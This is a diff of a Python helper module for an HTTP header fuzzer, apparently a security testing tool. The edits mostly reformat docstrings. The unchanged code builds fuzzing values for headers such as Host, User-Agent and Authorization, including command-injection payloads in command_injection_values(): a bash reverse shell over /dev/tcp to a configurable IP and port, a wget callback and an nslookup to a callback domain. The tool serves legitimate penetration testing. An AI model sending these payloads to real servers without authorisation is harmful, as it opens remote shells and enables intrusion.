@@ -1,17 +1,13 @@
-''' This file contains functions that determine and return header
-values used by http_header_fuzzer.py.
-'''
-
+""" This file contains functions that determine and return header values used by http_header_fuzzer.py """
 import string
 import random
-from config import *
+from .config import *
 
 
 def get_header_values(test, header):
-    ''' Accepts the name of an HTTP header and returns the contents of a 
+    """ Accepts the name of an HTTP header and returns the contents of a
     function containing a list of header values associated with the header
-    name.
-    '''
+    name """
     if header == 'User-Agent':
         return get_useragent_header_values(test)
     if header == 'Host':
@@ -31,8 +27,7 @@ def get_header_values(test, header):
 
 
 def get_random_useragent():
-    ''' Returns a randomly chosen User-Agent string.
-    '''
+    """ Returns a randomly chosen User-Agent string """
     win_edge = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
     win_firefox = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/43.0'
     win_chrome = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
@@ -49,19 +44,19 @@ def get_random_useragent():
         6: ie
     }
     rand_num = random.randrange(1, (len(ua_dict) + 1))
+
     return ua_dict[rand_num]
 
 
 def get_random_string(length):
-    ''' Returns a random string consisting of lowercase letters.
-    '''
+    """ Returns a random string consisting of lowercase letters """
     letters = string.ascii_lowercase
+
     return ''.join(random.choice(letters) for i in range(length))
 
 
 def get_host_header_values(test):
-    ''' Returns host headers values.
-    '''
+    """ Returns host header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -79,12 +74,12 @@ def get_host_header_values(test):
     if test == 'command injection':
         items = command_injection_values()
         values += [item for item in items]
+
     return values
 
 
 def get_useragent_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(40)
@@ -100,12 +95,12 @@ def get_useragent_header_values(test):
     if test == 'command injection':
         items = command_injection_values()
         values += [item for item in items]
+
     return values
 
 
 def get_forwarded_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -120,12 +115,12 @@ def get_forwarded_header_values(test):
     if test == 'error':
         items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
         values += [item for item in items]
+
     return values
 
 
 def get_X_forwarded_for_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -140,12 +135,12 @@ def get_X_forwarded_for_header_values(test):
     if test == 'error':
         items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
         values += [item for item in items]
+
     return values
 
 
 def get_from_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -154,12 +149,12 @@ def get_from_header_values(test):
         for i in range(50, 500, 50):
             random_string = get_random_string(i)
             values.append(random_string)
+
     return values
 
 
 def get_connection_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -171,12 +166,12 @@ def get_connection_header_values(test):
     if test == 'command injection':
         items = command_injection_values()
         values += [item for item in items]
+
     return values
 
 
 def get_referer_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -191,12 +186,12 @@ def get_referer_header_values(test):
     if test == 'command injection':
         items = command_injection_values()
         values += [item for item in items]
+
     return values
 
 
 def get_authorization_header_values(test):
-    ''' Returns header values.
-    '''
+    """ Returns header values """
     values = []
     if test == 'reflection':
         random_string = get_random_string(10)
@@ -214,12 +209,12 @@ def get_authorization_header_values(test):
     if test == 'command injection':
         items = command_injection_values()
         values += [item for item in items]
+
     return values
 
 
 def command_injection_values():
-    ''' Returns values dealing with command injection.
-    '''
+    """ Returns values dealing with command injection """
     ip = IP_ADDRESS if IP_ADDRESS else '127.0.0.1'
     port = PORT if PORT else '80'
     domain = DOMAIN_NAME if DOMAIN_NAME else 'laconicwolf.com'
@@ -228,4 +223,5 @@ def command_injection_values():
               ';/bin/bash -i > /dev/tcp/' + ip + '/' + port + '0<&1 2>&1',
               ';nslookup ' + random_string + '.' + domain,
               ';wget http://' + ip]
+
     return values
